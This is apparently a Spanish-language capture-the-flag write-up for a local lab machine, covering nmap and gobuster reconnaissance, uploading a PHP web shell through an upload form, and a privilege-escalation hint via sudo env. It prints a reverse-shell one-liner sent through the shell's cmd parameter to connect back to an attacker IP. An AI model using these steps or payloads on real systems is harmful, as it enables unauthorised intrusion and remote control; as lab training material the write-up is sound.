tags:
____
## Reconocimiento

```bash
ping -c 1 172.17.0.2
```

![Pasted image 20251030055947](../../../Anexos/Pasted%20image%2020251030055947.png)

Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![Pasted image 20251030060016](../../../Anexos/Pasted%20image%2020251030060016.png)

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80,8089 -vvv -oN version 172.17.0.2
```

![Pasted image 20251030060031.png](Pasted%20image%2020251030060031.png)

Vemos que tenemos un servicio web por el puerto 80, así que vamos a aplicar fuzzing para descubrir directorios y archivos:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o dirs.txt
```

![Pasted image 20251030060211.png](Pasted%20image%2020251030060211.png)

Vamos al directorio /upload.php:

![Pasted image 20251030060252.png](Pasted%20image%2020251030060252.png)

Creo un archivo php malicioso y pruebo subirlo:

![Pasted image 20251030062808.png](Pasted%20image%2020251030062808.png)

![Pasted image 20251030062821.png](Pasted%20image%2020251030062821.png)

Ahora vamos al directorio uploads/shell.php y probamos ejecutar comandos con el parámetro cmd:

![Pasted image 20251030062905.png](Pasted%20image%2020251030062905.png)

Funciona, así que vamos a ejecutar una reverse shell a nuestra máquina atacante:

```python
http://172.17.0.2/uploads/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"
```

![Pasted image 20251030063215.png](Pasted%20image%2020251030063215.png)

Ahora que ya estamos dentro de la máquina, ejecutando sudo -l vemos que podemos ejecutar el binario env como sudo, así que buscamos en GTFObins para escalar privilegios:

![Pasted image 20251030063336](../../../Anexos/Pasted%20image%2020251030063336.png)

![Pasted image 20251030063402.png](Pasted%20image%2020251030063402.png)
